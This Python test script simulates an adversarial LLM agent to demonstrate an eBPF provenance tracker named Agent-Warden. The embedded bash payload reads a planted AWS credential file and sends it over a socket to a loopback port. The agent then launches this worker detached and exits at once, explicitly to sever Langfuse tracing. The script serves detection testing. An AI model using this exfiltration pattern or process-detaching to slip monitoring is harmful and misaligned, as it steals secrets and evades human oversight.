#!/usr/bin/env python3
"""
Attack Simulation: LLM Agent Prompt-Injection & Evasion Lifecycle
Demonstrating cross-process, cross-file provenance tracking with Agent-Warden.
"""

import os
import sys
import time
import subprocess

TEST_DIR = "/tmp/agent_warden_test"
PID_FILE = os.path.join(TEST_DIR, "agent.pid")
SENSITIVE_FILE = os.path.join(TEST_DIR, "sensitive_credentials.env")
PAYLOAD_SCRIPT = os.path.join(TEST_DIR, "malicious_cron.sh")
RENAMED_SCRIPT = os.path.join(TEST_DIR, "malicious_worker.sh")

def main():
    os.makedirs(TEST_DIR, exist_ok=True)
    my_pid = os.getpid()

    # Register root agent PID for collector reference
    with open(PID_FILE, "w") as f:
        f.write(str(my_pid))

    wait_file = os.path.join(TEST_DIR, "ready")
    if os.path.exists(wait_file):
        os.remove(wait_file)

    print(f"\n========================================================")
    print(f" [!] Adversarial Agent Started (PID: {my_pid})")
    print(f"========================================================")

    if "--wait-ready" in sys.argv:
        print("[*] Waiting for Agent-Warden collector probe attachment...")
        waited = 0
        while not os.path.exists(wait_file) and waited < 10:
            time.sleep(0.1)
            waited += 0.1
        print("[+] Probe attachment acknowledged. Executing attack workload!")
    else:
        time.sleep(0.5)

    # Step 1: Agent creates a sensitive credential file (P -> F write propagation)
    print(f"[*] Step 1: Agent creates sensitive credential store at {SENSITIVE_FILE}")
    with open(SENSITIVE_FILE, "w") as f:
        f.write("AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE_SECRET_TOKEN\n")
        f.flush()
    time.sleep(0.3)

    # Step 2: Phase 1 (Persistent Poisoning) - Agent writes malicious payload script
    print(f"[*] Step 2 [Phase 1]: Agent writes malicious payload to {PAYLOAD_SCRIPT}")
    payload_content = f"""#!/bin/bash
# Autonomous evasion worker script (Watchdog timeout: 10s)
sleep 0.5
echo "[Worker $BASHPID] Initiating stealth exfiltration..."

# File rename operation (Namespace alteration)
mv {PAYLOAD_SCRIPT} {RENAMED_SCRIPT} 2>/dev/null || true

# Cross-process file read (F -> P read back-propagation)
if [ -f {SENSITIVE_FILE} ]; then
    SECRET=$(cat {SENSITIVE_FILE})
    echo "[Worker $BASHPID] Read tainted credential: $SECRET"
fi

# Sensitive network exfiltration to 127.0.0.1:8888 (Loopback boundary)
python3 -c "
import socket
s = socket.socket()
s.settimeout(5)
try:
    s.connect(('127.0.0.1', 8888))
    s.sendall(b'EXFILTRATED_KEY=AKIAIOSFODNN7EXAMPLE_SECRET_TOKEN\\n')
    s.close()
    print('[Worker] Exfiltration socket transmission completed.')
except Exception as e:
    print(f'[Worker] Exfiltration socket notification: {{e}}')
"
echo "[Worker $BASHPID] Transient worker self-terminating."
exit 0
"""
    with open(PAYLOAD_SCRIPT, "w") as f:
        f.write(payload_content)
        f.flush()
    os.chmod(PAYLOAD_SCRIPT, 0o755)
    time.sleep(0.3)

    # Step 3: Phase 2 (Uncoupling & Chain-breaking)
    # Agent spawns a detached transient subprocess and immediately terminates itself.
    print(f"[*] Step 3 [Phase 2]: Agent dispatches detached background worker and initiates self-termination...")
    proc = subprocess.Popen(["/bin/bash", PAYLOAD_SCRIPT],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            preexec_fn=os.setpgrp)

    print(f"[!] Dispatched worker process PID: {proc.pid}")
    print(f"[!] Agent (PID: {my_pid}) EXITING NOW to sever application-level Langfuse tracing context!\n")
    sys.stdout.flush()

    # Immediate exit (triggers Exit-Triggered Causal Aggregation in eBPF)
    sys.exit(0)

if __name__ == "__main__":
    main()
